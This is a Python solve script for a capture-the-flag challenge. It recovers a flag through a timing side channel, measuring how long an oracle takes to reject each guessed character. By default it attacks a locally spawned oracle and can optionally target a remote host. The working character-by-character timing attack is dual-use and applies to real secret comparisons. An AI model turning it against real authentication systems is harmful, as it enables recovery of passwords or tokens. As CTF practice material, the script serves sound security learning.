#!/usr/bin/env python3
"""
Taylor's Magical Flag Oracle. The checker sleeps 0.25 s after every character
that matches, so how long a guess takes tells you how much of it was right.

The real service is gone. By default this spawns `local_oracle.py`, which runs
the organizers' comparison loop against a known flag, and attacks that:
```
python3 solve.py                      spawn a local oracle at 0.04 s per step
python3 solve.py --unit 0.25          the real timing, slow
CTF_TARGET='nc host 11340' python3 solve.py --unit 0.25
```
Three things differ from the 2017 script. The step length is calibrated from
the oracle rather than assumed, the threshold sits halfway between the two
outcomes instead of on top of one of them, and a position where no candidate
crosses the threshold falls back to the slowest candidate instead of spinning
forever.
"""

import argparse
import os
import re
import socket
import statistics
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ORACLE = os.path.join(HERE, "local_oracle.py")

ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_}"
PROMPT = b"> "


class Oracle:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=60)
        self.buf = b""
        self.read_to_prompt()

    def read_to_prompt(self):
        while PROMPT not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("oracle closed the connection")
            self.buf += chunk
        head, self.buf = self.buf.split(PROMPT, 1)
        return head

    def ask(self, guess):
        """Send one guess. Returns (seconds elapsed, reply text)."""
        start = time.perf_counter()
        self.sock.sendall(guess.encode() + b"\n")
        reply = self.read_to_prompt()
        return time.perf_counter() - start, reply.decode("latin1").strip()


def timed(oracle, guess, trials):
    """Median of `trials` timings. One sample is enough on a quiet local socket."""
    samples = []
    for _ in range(trials):
        elapsed, reply = oracle.ask(guess)
        samples.append(elapsed)
        if reply.startswith("True"):
            return statistics.median(samples), True
    return statistics.median(samples), False


def attack(oracle, prefix, trials, limit):
    """
    Nothing here assumes the sleep is 0.25 s. `sleep` overshoots by a few
    milliseconds per call and the network adds a constant, so a threshold
    written as `unit * (k + 1)` drifts off as k grows. Both quantities come
    out of the oracle instead: the baseline is the prefix's own round trip,
    and one step is the gap between two prefixes that differ by a character.
    """
    known = prefix
    shorter, _ = timed(oracle, known[:-1], trials)
    baseline, _ = timed(oracle, known, trials)
    step = baseline - shorter
    print(f"  calibrated: {len(known)} matches cost {baseline:.3f}s, "
          f"one step is {step:.3f}s")

    while len(known) < limit:
        threshold = baseline + 0.5 * step
        seen = []
        hit = None
        for ch in ALPHABET:
            elapsed, solved = timed(oracle, known + ch, trials)
            if solved:
                print(f"  oracle accepted {known + ch!r}")
                return known + ch
            seen.append((elapsed, ch))
            if elapsed > threshold:
                hit = (elapsed, ch)
                break

        if hit is None:
            # Nothing crossed, so every candidate is already timed and the
            # slowest one costs nothing extra to pick. One sleep still separates
            # the right character from the rest even when the threshold drifted.
            seen.sort(reverse=True)
            top, runner = seen[0], seen[1]
            if top[0] - runner[0] < 0.4 * step:
                print(f"no character stands out after {known!r}: "
                      f"{top[1]!r} at {top[0]:.3f}s against {runner[1]!r} "
                      f"at {runner[0]:.3f}s", file=sys.stderr)
                return known
            hit = top
            print(f"  threshold {threshold:.3f}s missed, took the slowest instead")

        known += hit[1]
        step = hit[0] - baseline
        baseline = hit[0]
        print(f"  {known!r}  at {baseline:.3f}s, threshold was {threshold:.3f}s")
    return known


def spawn_local(unit):
    proc = subprocess.Popen(
        [sys.executable, ORACLE, "--port", "0", "--unit", str(unit)],
        stdout=subprocess.PIPE, text=True,
    )
    line = proc.stdout.readline()
    m = re.search(r"listening (\d+)", line)
    if not m:
        proc.kill()
        raise SystemExit(f"local oracle did not start: {line!r}")
    return proc, int(m.group(1))


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--unit", type=float, default=0.04,
                    help="local oracle only: seconds slept per matching character")
    ap.add_argument("--prefix", default="flag{", help="known leading characters")
    ap.add_argument("--trials", type=int, default=1, help="timings per candidate")
    ap.add_argument("--limit", type=int, default=40, help="stop after this many characters")
    a = ap.parse_args()

    proc = None
    target = os.environ.get("CTF_TARGET")
    if target:
        m = re.search(r"([\w.\-]+)\s+(\d+)", target)
        host, port = m.group(1), int(m.group(2))
    else:
        proc, port = spawn_local(a.unit)
        host = "127.0.0.1"
        print(f"local oracle on {host}:{port}, {a.unit}s per step")

    try:
        oracle = Oracle(host, port)
        found = attack(oracle, a.prefix, a.trials, a.limit)
    finally:
        if proc:
            proc.kill()

    print(f"flag {found}")
    return 0 if found.endswith("}") else 1


if __name__ == "__main__":
    sys.exit(main())
